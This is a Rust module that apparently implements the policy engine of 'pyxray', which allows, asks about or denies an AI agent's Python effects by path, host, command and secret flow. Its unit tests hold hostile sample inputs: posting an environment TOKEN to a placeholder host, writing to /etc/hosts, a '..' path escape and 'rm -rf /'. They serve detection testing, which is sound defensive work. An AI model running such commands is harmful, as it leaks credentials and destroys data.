//! `.pyxray.toml`: what may run without asking, what must be asked, what
//! must not run — per effect, per path, per host, per command.
//!
//! ```toml
//! version = 1
//! default = "allow"          # when no rule matches a hit
//! gate = 60                  # risk above this is at least "ask"
//!
//! [[rule]]                   # rules are tried in order; first match wins
//! effect = "fs_write"
//! paths = ["{repo}/**", "/tmp/**"]
//! decision = "allow"
//!
//! [[rule]]
//! effect = "net"
//! hosts = ["pypi.org", "*.pythonhosted.org"]
//! decision = "allow"
//!
//! [[rule]]
//! effect = "net"
//! decision = "ask"
//!
//! [[rule]]
//! flow = "exfiltration"
//! decision = "deny"
//! ```
//!
//! Evaluated here, in the core, so every harness, the shim, the MCP server
//! and the binary share one engine. The verdict rides on the feed event as
//! `policy`; the harness adapters turn it into their own "ask" or "deny".
//!
//! Two properties matter more than any feature:
//!
//! - **An unknown target never matches a constrained rule.** A rule with
//!   `hosts = [...]` only matches a call whose URL the analyser knows exactly
//!   (`EffectHit::resolved`). A URL built at runtime falls through to the
//!   next rule — so an allow-list cannot be walked around with an f-string.
//! - **A repository's policy can only tighten yours.** The agent being
//!   watched can write `.pyxray.toml` in the repo it works in. The strictest
//!   of your user policy and the repo's wins, unless your user policy says
//!   `trust_repo_policy = true`.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::model::{Effect, EffectHit, Report};

/// What a policy says about a call.
#[derive(
    Serialize, Deserialize, Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Default,
)]
#[serde(rename_all = "snake_case")]
pub enum Decision {
    #[default]
    Allow,
    Ask,
    Deny,
}

impl Decision {
    pub fn word(self) -> &'static str {
        match self {
            Decision::Allow => "allow",
            Decision::Ask => "ask",
            Decision::Deny => "deny",
        }
    }
}

/// The verdict carried on a feed event.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Eq)]
pub struct PolicyVerdict {
    pub decision: Decision,
    /// Which rule decided: `~/.config/pyxray/policy.toml#3 net deny`, `gate`,
    /// `default`, or `error`.
    pub rule: String,
    /// One line for a person: what it matched and why.
    pub reason: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
}

#[derive(Deserialize, Clone, Debug, Default)]
#[serde(deny_unknown_fields)]
struct PolicyFile {
    #[serde(default)]
    version: Option<u32>,
    #[serde(default)]
    default: Option<Decision>,
    #[serde(default)]
    gate: Option<u8>,
    #[serde(default)]
    trust_repo_policy: Option<bool>,
    #[serde(default, rename = "rule")]
    rules: Vec<Rule>,
}

#[derive(Deserialize, Clone, Debug)]
#[serde(deny_unknown_fields)]
struct Rule {
    /// An effect id (`fs_write`, `net`, `process`…) or `any`.
    #[serde(default)]
    effect: Option<String>,
    /// A flow kind: `exfiltration`, `secret_to_process`, `secret_to_disk`.
    #[serde(default)]
    flow: Option<String>,
    #[serde(default)]
    paths: Option<Vec<String>>,
    #[serde(default)]
    hosts: Option<Vec<String>>,
    #[serde(default)]
    commands: Option<Vec<String>>,
    /// Environment variable names, for `env`.
    #[serde(default)]
    names: Option<Vec<String>>,
    decision: Decision,
    #[serde(default)]
    reason: Option<String>,
}

/// One policy file, parsed (or not).
#[derive(Clone, Debug)]
struct Layer {
    path: PathBuf,
    /// Where `{repo}` points: the directory the file is in.
    dir: PathBuf,
    parsed: Result<PolicyFile, String>,
}

/// Everything that applies to one snippet, in the order it was found.
#[derive(Clone, Debug, Default)]
pub struct Policy {
    user: Option<Layer>,
    repo: Option<Layer>,
}

impl Policy {
    /// Nothing to apply.
    pub fn is_empty(&self) -> bool {
        self.user.is_none() && self.repo.is_none()
    }

    /// The files in effect, for `pyx policy`.
    pub fn files(&self) -> Vec<(String, Result<usize, String>)> {
        [&self.user, &self.repo]
            .into_iter()
            .flatten()
            .map(|l| {
                (
                    l.path.display().to_string(),
                    l.parsed
                        .as_ref()
                        .map(|f| f.rules.len())
                        .map_err(Clone::clone),
                )
            })
            .collect()
    }

    /// Load one file as the whole policy (`PYXRAY_POLICY=path`).
    pub fn from_file(path: &Path) -> Policy {
        Policy {
            user: Some(load(path)),
            repo: None,
        }
    }

    /// Find the policies that apply to a snippet at `dir`: `PYXRAY_POLICY`
    /// (a path, or `off`), else the user file plus the nearest `.pyxray.toml`
    /// walking up from `dir` to the repository root.
    pub fn discover(dir: Option<&Path>) -> Policy {
        match std::env::var("PYXRAY_POLICY") {
            Ok(v) if matches!(v.trim(), "off" | "0" | "none") => return Policy::default(),
            Ok(v) if !v.trim().is_empty() => return Policy::from_file(Path::new(v.trim())),
            _ => {}
        }
        let user = user_policy_path().filter(|p| p.is_file()).map(|p| load(&p));
        let repo = dir.and_then(find_repo_policy).map(|p| load(&p));
        Policy { user, repo }
    }

    /// The verdict for a report. `cwd` resolves relative paths in targets.
    pub fn evaluate(&self, report: &Report, cwd: Option<&Path>) -> Option<PolicyVerdict> {
        let user = self.user.as_ref().map(|l| evaluate_layer(l, report, cwd));
        let repo = self.repo.as_ref().map(|l| evaluate_layer(l, report, cwd));
        let trust_repo = self
            .user
            .as_ref()
            .and_then(|l| l.parsed.as_ref().ok())
            .and_then(|f| f.trust_repo_policy)
            .unwrap_or(false);
        match (user, repo) {
            (None, None) => None,
            (Some(v), None) | (None, Some(v)) => Some(v),
            (Some(_), Some(r)) if trust_repo => Some(r),
            (Some(u), Some(r)) => Some(if r.decision > u.decision { r } else { u }),
        }
    }
}

fn load(path: &Path) -> Layer {
    let dir = path
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| PathBuf::from("."));
    let parsed = std::fs::read_to_string(path)
        .map_err(|e| format!("{}: {e}", path.display()))
        .and_then(|text| parse(&text).map_err(|e| format!("{}: {e}", path.display())));
    Layer {
        path: path.to_path_buf(),
        dir,
        parsed,
    }
}

fn parse(text: &str) -> Result<PolicyFile, String> {
    let file: PolicyFile = toml::from_str(text).map_err(|e| e.message().to_string())?;
    if let Some(v) = file.version {
        if v != 1 {
            return Err(format!(
                "version {v} is not one this pyxray understands (1)"
            ));
        }
    }
    for (i, rule) in file.rules.iter().enumerate() {
        if let Some(effect) = &rule.effect {
            if effect != "any" && Effect::from_id(effect).is_none() {
                return Err(format!("rule {}: unknown effect {effect:?}", i + 1));
            }
        }
        if let Some(flow) = &rule.flow {
            if !matches!(
                flow.as_str(),
                "exfiltration" | "secret_to_process" | "secret_to_disk" | "any"
            ) {
                return Err(format!("rule {}: unknown flow {flow:?}", i + 1));
            }
        }
        if rule.effect.is_none() && rule.flow.is_none() {
            return Err(format!("rule {}: needs `effect` or `flow`", i + 1));
        }
    }
    Ok(file)
}

/// `$PYXRAY_POLICY_HOME`, else `$XDG_CONFIG_HOME/pyxray/policy.toml`,
/// `%APPDATA%\pyxray\policy.toml` on Windows, `~/.config/pyxray/policy.toml`.
pub fn user_policy_path() -> Option<PathBuf> {
    let var = |n: &str| std::env::var(n).ok().filter(|v| !v.is_empty());
    if let Some(home) = var("PYXRAY_POLICY_HOME") {
        return Some(PathBuf::from(home).join("policy.toml"));
    }
    if let Some(xdg) = var("XDG_CONFIG_HOME") {
        return Some(PathBuf::from(xdg).join("pyxray").join("policy.toml"));
    }
    if cfg!(windows) {
        if let Some(app) = var("APPDATA") {
            return Some(PathBuf::from(app).join("pyxray").join("policy.toml"));
        }
    }
    var("HOME").or_else(|| var("USERPROFILE")).map(|h| {
        PathBuf::from(h)
            .join(".config")
            .join("pyxray")
            .join("policy.toml")
    })
}

/// The nearest `.pyxray.toml` at or above `dir`, not above the repository
/// root (the first directory holding `.git`).
fn find_repo_policy(dir: &Path) -> Option<PathBuf> {
    let start = dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf());
    for d in start.ancestors() {
        let candidate = d.join(".pyxray.toml");
        if candidate.is_file() {
            return Some(candidate);
        }
        if d.join(".git").exists() {
            break;
        }
    }
    None
}

fn evaluate_layer(layer: &Layer, report: &Report, cwd: Option<&Path>) -> PolicyVerdict {
    let file = match &layer.parsed {
        Ok(f) => f,
        // A policy you meant to have and got wrong must not silently turn
        // into "allow everything" — nor block every call you make.
        Err(why) => {
            return PolicyVerdict {
                decision: Decision::Ask,
                rule: "error".into(),
                reason: format!("policy error: {why}"),
                line: None,
                file: None,
            }
        }
    };
    let label = short(&layer.path);
    let default = file.default.unwrap_or_default();
    let mut best = PolicyVerdict {
        decision: default,
        rule: "default".into(),
        reason: format!("no rule matched ({})", default.word()),
        line: None,
        file: None,
    };
    let mut first = true;
    for hit in report.all_effects() {
        let found = file
            .rules
            .iter()
            .enumerate()
            .find(|(_, r)| matches(r, hit, &layer.dir, cwd));
        let v = match found {
            Some((i, rule)) => PolicyVerdict {
                decision: rule.decision,
                rule: format!(
                    "{label}#{} {} {}",
                    i + 1,
                    rule.flow
                        .as_deref()
                        .or(rule.effect.as_deref())
                        .unwrap_or("any"),
                    rule.decision.word()
                ),
                reason: rule.reason.clone().unwrap_or_else(|| describe(hit)),
                line: Some(hit.line),
                file: hit.file.clone(),
            },
            None => PolicyVerdict {
                decision: default,
                rule: "default".into(),
                reason: describe(hit),
                line: Some(hit.line),
                file: hit.file.clone(),
            },
        };
        if first || v.decision > best.decision {
            best = v;
            first = false;
        }
    }
    if let Some(gate) = file.gate {
        if report.metrics.risk > gate && best.decision < Decision::Ask {
            best = PolicyVerdict {
                decision: Decision::Ask,
                rule: format!("{label} gate"),
                reason: format!(
                    "risk {} is over the policy's gate of {gate}",
                    report.metrics.risk
                ),
                line: None,
                file: None,
            };
        }
    }
    best
}

fn describe(hit: &EffectHit) -> String {
    match (&hit.flow, &hit.target) {
        (Some(f), Some(t)) => format!("{} → {t}", f.source),
        (_, Some(t)) => format!("{} {t}", hit.verb),
        _ => hit.verb.clone(),
    }
}

fn short(path: &Path) -> String {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .ok();
    let text = path.display().to_string();
    match home {
        Some(h) if !h.is_empty() && text.starts_with(&h) => format!("~{}", &text[h.len()..]),
        _ => text,
    }
}

fn matches(rule: &Rule, hit: &EffectHit, repo: &Path, cwd: Option<&Path>) -> bool {
    if let Some(effect) = &rule.effect {
        if effect != "any" && Effect::from_id(effect) != Some(hit.effect) {
            return false;
        }
    }
    if let Some(flow) = &rule.flow {
        match &hit.flow {
            Some(f) if flow == "any" || f.kind.id() == flow => {}
            _ => return false,
        }
    }
    // Constraints. Each one present must hold, and holding needs the exact
    // target — unknown never matches.
    let target = hit.resolved.as_deref();
    if let Some(globs) = &rule.paths {
        let Some(t) = target else { return false };
        let path = absolute(t, cwd);
        if !globs.iter().any(|g| glob(&expand(g, repo, cwd), &path)) {
            return false;
        }
    }
    if let Some(globs) = &rule.hosts {
        let Some(host) = target.and_then(host_of) else {
            return false;
        };
        if !globs.iter().any(|g| glob(&g.to_ascii_lowercase(), &host)) {
            return false;
        }
    }
    if let Some(globs) = &rule.commands {
        let Some(t) = target else { return false };
        let command = t.split_whitespace().collect::<Vec<_>>().join(" ");
        if !globs.iter().any(|g| glob_words(g, &command)) {
            return false;
        }
    }
    if let Some(globs) = &rule.names {
        let Some(t) = target else { return false };
        if !globs.iter().any(|g| glob(g, t)) {
            return false;
        }
    }
    true
}

fn home() -> Option<String> {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .ok()
        .filter(|h| !h.is_empty())
}

/// `{repo}`, `{cwd}`, `{home}` and a leading `~`, and forward slashes.
fn expand(pattern: &str, repo: &Path, cwd: Option<&Path>) -> String {
    let mut p = pattern.replace("{repo}", &slashes(repo));
    if let Some(c) = cwd {
        p = p.replace("{cwd}", &slashes(c));
    }
    if let Some(h) = home() {
        p = p.replace("{home}", &h.replace('\\', "/"));
        if p == "~" || p.starts_with("~/") {
            p = format!("{}{}", h.replace('\\', "/"), &p[1..]);
        }
    }
    p
}

fn slashes(p: &Path) -> String {
    let canonical = p.canonicalize().unwrap_or_else(|_| p.to_path_buf());
    let text = canonical.display().to_string().replace('\\', "/");
    // Windows' canonical form is `\\?\C:\…`; the glob wants `C:/…`.
    text.strip_prefix("//?/")
        .map(str::to_string)
        .unwrap_or(text)
}

/// A target path made absolute and normalised, `~` expanded, `.`/`..`
/// resolved lexically (the file may not exist yet).
fn absolute(target: &str, cwd: Option<&Path>) -> String {
    let t = target.replace('\\', "/");
    let expanded = match home() {
        Some(h) if t == "~" || t.starts_with("~/") => {
            format!("{}{}", h.replace('\\', "/"), &t[1..])
        }
        _ => t,
    };
    let is_abs = expanded.starts_with('/')
        || (expanded.len() > 2 && expanded.as_bytes()[1] == b':' && expanded.as_bytes()[2] == b'/');
    let joined = if is_abs {
        expanded
    } else {
        match cwd {
            Some(c) => format!("{}/{}", slashes(c), expanded),
            None => expanded,
        }
    };
    let mut out: Vec<&str> = Vec::new();
    for part in joined.split('/') {
        match part {
            "" | "." if !out.is_empty() => {}
            ".." => {
                if out.len() > 1 {
                    out.pop();
                }
            }
            p => out.push(p),
        }
    }
    let s = out.join("/");
    if joined.starts_with('/') && !s.starts_with('/') {
        format!("/{s}")
    } else {
        s
    }
}

/// The host of a URL, lower-cased, without port or credentials.
pub fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://").map(|(_, r)| r)?;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host = authority.rsplit('@').next()?;
    let host = if let Some(stripped) = host.strip_prefix('[') {
        stripped.split(']').next()?
    } else {
        host.split(':').next()?
    };
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

/// Shell-style globbing over `/`-separated text: `**` crosses separators,
/// `*` and `?` do not, and `dir/**` also matches `dir` itself.
pub fn glob(pattern: &str, text: &str) -> bool {
    fn go(p: &[u8], t: &[u8]) -> bool {
        if t.is_empty() && p == b"/**" {
            return true;
        }
        match p.first() {
            None => t.is_empty(),
            Some(b'*') if p.get(1) == Some(&b'*') => {
                let rest = &p[2..];
                (0..=t.len()).any(|i| go(rest, &t[i..]))
                    || rest
                        .strip_prefix(b"/")
                        .is_some_and(|r| (0..=t.len()).any(|i| go(r, &t[i..])))
            }
            Some(b'*') => {
                let mut i = 0;
                loop {
                    if go(&p[1..], &t[i..]) {
                        return true;
                    }
                    if i >= t.len() || t[i] == b'/' {
                        return false;
                    }
                    i += 1;
                }
            }
            Some(b'?') => !t.is_empty() && t[0] != b'/' && go(&p[1..], &t[1..]),
            Some(c) => !t.is_empty() && t[0] == *c && go(&p[1..], &t[1..]),
        }
    }
    go(pattern.as_bytes(), text.as_bytes())
}

/// Globbing for command lines, where `*` matches anything at all — `git *`
/// matches `git push origin main`, paths and all.
fn glob_words(pattern: &str, text: &str) -> bool {
    fn go(p: &[u8], t: &[u8]) -> bool {
        match p.first() {
            None => t.is_empty(),
            Some(b'*') => (0..=t.len()).any(|i| go(&p[1..], &t[i..])),
            Some(b'?') => !t.is_empty() && go(&p[1..], &t[1..]),
            Some(c) => !t.is_empty() && t[0] == *c && go(&p[1..], &t[1..]),
        }
    }
    go(pattern.as_bytes(), text.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(dir: &Path, text: &str) -> PathBuf {
        std::fs::create_dir_all(dir).unwrap();
        let p = dir.join(".pyxray.toml");
        std::fs::write(&p, text).unwrap();
        p
    }

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("pyxray-policy-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d.canonicalize().unwrap()
    }

    fn verdict(policy: &str, src: &str, dir: &Path) -> PolicyVerdict {
        let p = write(dir, policy);
        let report = crate::xray(src, "t.py");
        Policy::from_file(&p).evaluate(&report, Some(dir)).unwrap()
    }

    #[test]
    fn globs() {
        assert!(glob("/tmp/**", "/tmp/a/b/c"));
        assert!(glob("/tmp/**", "/tmp"));
        assert!(glob("/tmp/*.log", "/tmp/x.log"));
        assert!(!glob("/tmp/*.log", "/tmp/a/x.log"));
        assert!(glob("*.pythonhosted.org", "files.pythonhosted.org"));
        assert!(!glob("pypi.org", "evil-pypi.org"));
        assert!(glob("a?c", "abc") && !glob("a?c", "a/c"));
        assert!(glob("**/secrets/**", "/home/u/proj/secrets/x"));
        assert!(glob_words("git *", "git push origin main"));
        assert!(!glob_words("git *", "rm -rf /"));
    }

    #[test]
    fn hosts() {
        assert_eq!(
            host_of("https://User:pw@API.Example.com:8443/v1?q").as_deref(),
            Some("api.example.com")
        );
        assert_eq!(host_of("http://[::1]:8000/").as_deref(), Some("::1"));
        assert_eq!(host_of("not a url"), None);
    }

    #[test]
    fn first_match_wins_and_default_applies() {
        let d = tmp("first");
        let policy = "default = \"ask\"\n[[rule]]\neffect = \"net\"\nhosts = [\"pypi.org\"]\ndecision = \"allow\"\n[[rule]]\neffect = \"net\"\ndecision = \"deny\"\n";
        let ok = verdict(
            policy,
            "import requests\nrequests.get('https://pypi.org/simple')\n",
            &d,
        );
        assert_eq!(ok.decision, Decision::Allow, "{ok:?}");
        let bad = verdict(
            policy,
            "import requests\nrequests.get('https://evil.example/x')\n",
            &d,
        );
        assert_eq!(bad.decision, Decision::Deny);
        assert!(bad.rule.ends_with("#2 net deny"), "{}", bad.rule);
        let other = verdict(policy, "import os\nos.system('ls')\n", &d);
        assert_eq!(other.decision, Decision::Ask, "default");
    }

    #[test]
    fn an_unknown_target_never_matches_an_allow_list() {
        let d = tmp("unknown");
        let policy = "[[rule]]\neffect = \"net\"\nhosts = [\"pypi.org\"]\ndecision = \"allow\"\n[[rule]]\neffect = \"net\"\ndecision = \"deny\"\n";
        let v = verdict(
            policy,
            "import requests\nhost = input()\nrequests.get(f'https://{host}/x')\n",
            &d,
        );
        assert_eq!(v.decision, Decision::Deny, "{v:?}");
    }

    #[test]
    fn paths_resolve_against_repo_and_cwd() {
        let d = tmp("paths");
        let policy = "[[rule]]\neffect = \"fs_write\"\npaths = [\"{repo}/**\"]\ndecision = \"allow\"\n[[rule]]\neffect = \"fs_write\"\ndecision = \"ask\"\n";
        let inside = verdict(policy, "open('out/report.txt', 'w').write('x')\n", &d);
        assert_eq!(inside.decision, Decision::Allow, "{inside:?}");
        let outside = verdict(policy, "open('/etc/hosts', 'w').write('x')\n", &d);
        assert_eq!(outside.decision, Decision::Ask);
        let escape = verdict(policy, "open('../../etc/x', 'w')\n", &d);
        assert_eq!(
            escape.decision,
            Decision::Ask,
            "`..` is resolved before matching"
        );
    }

    #[test]
    fn flows_can_be_named() {
        let d = tmp("flows");
        let policy = "[[rule]]\nflow = \"exfiltration\"\ndecision = \"deny\"\nreason = \"no secrets leave\"\n";
        let v = verdict(
            policy,
            "import os, requests\nrequests.post('https://x', data=os.environ['TOKEN'])\n",
            &d,
        );
        assert_eq!(v.decision, Decision::Deny);
        assert_eq!(v.reason, "no secrets leave");
        let v = verdict(
            policy,
            "import requests\nrequests.post('https://x', data='hi')\n",
            &d,
        );
        assert_eq!(v.decision, Decision::Allow);
    }

    #[test]
    fn commands_and_env_names() {
        let d = tmp("cmds");
        let policy = "default = \"deny\"\n[[rule]]\neffect = \"process\"\ncommands = [\"git status*\", \"ls *\"]\ndecision = \"allow\"\n[[rule]]\neffect = \"env\"\nnames = [\"HOME\", \"PATH\"]\ndecision = \"allow\"\n";
        assert_eq!(
            verdict(
                policy,
                "import subprocess\nsubprocess.run(['git', 'status', '-s'])\n",
                &d
            )
            .decision,
            Decision::Allow
        );
        assert_eq!(
            verdict(
                policy,
                "import subprocess\nsubprocess.run(['git', 'push'])\n",
                &d
            )
            .decision,
            Decision::Deny
        );
        assert_eq!(
            verdict(policy, "import os\nos.getenv('HOME')\n", &d).decision,
            Decision::Allow
        );
    }

    #[test]
    fn the_gate_asks_at_least() {
        let d = tmp("gate");
        let v = verdict("gate = 20\n", "import os\nos.system('ls')\n", &d);
        assert_eq!(v.decision, Decision::Ask);
        assert!(v.rule.ends_with("gate"));
    }

    #[test]
    fn a_broken_policy_asks_instead_of_allowing_or_blocking_everything() {
        let d = tmp("broken");
        for bad in [
            "[[rule]]\neffect = \"netz\"\ndecision = \"deny\"\n",
            "not = toml = at all",
            "[[rule]]\ndecision = \"deny\"\n",
            "version = 7\n",
        ] {
            let v = verdict(bad, "print(1)\n", &d);
            assert_eq!(v.decision, Decision::Ask, "{bad}");
            assert_eq!(v.rule, "error");
        }
    }

    #[test]
    fn a_repo_policy_only_tightens_unless_trusted() {
        let user_dir = tmp("user");
        let repo_dir = tmp("repo");
        let user = user_dir.join("policy.toml");
        std::fs::write(&user, "[[rule]]\neffect = \"net\"\ndecision = \"deny\"\n").unwrap();
        let repo = write(
            &repo_dir,
            "[[rule]]\neffect = \"net\"\ndecision = \"allow\"\n",
        );
        let report = crate::xray("import requests\nrequests.get('https://x.example')\n", "t");
        let p = Policy {
            user: Some(load(&user)),
            repo: Some(load(&repo)),
        };
        assert_eq!(p.evaluate(&report, None).unwrap().decision, Decision::Deny);

        std::fs::write(
            &user,
            "trust_repo_policy = true\n[[rule]]\neffect = \"net\"\ndecision = \"deny\"\n",
        )
        .unwrap();
        let p = Policy {
            user: Some(load(&user)),
            repo: Some(load(&repo)),
        };
        assert_eq!(p.evaluate(&report, None).unwrap().decision, Decision::Allow);

        // …and a stricter repo always wins.
        std::fs::write(&user, "[[rule]]\neffect = \"net\"\ndecision = \"allow\"\n").unwrap();
        std::fs::write(&repo, "[[rule]]\neffect = \"net\"\ndecision = \"ask\"\n").unwrap();
        let p = Policy {
            user: Some(load(&user)),
            repo: Some(load(&repo)),
        };
        assert_eq!(p.evaluate(&report, None).unwrap().decision, Decision::Ask);
    }

    #[test]
    fn discovery_stops_at_the_repository_root() {
        let top = tmp("disc");
        write(&top, "[[rule]]\neffect = \"any\"\ndecision = \"deny\"\n");
        let repo = top.join("repo");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::create_dir_all(repo.join("src/deep")).unwrap();
        assert_eq!(
            find_repo_policy(&repo.join("src/deep")),
            None,
            "not above .git"
        );
        let own = write(&repo, "[[rule]]\neffect = \"any\"\ndecision = \"ask\"\n");
        assert_eq!(find_repo_policy(&repo.join("src/deep")), Some(own));
    }
}
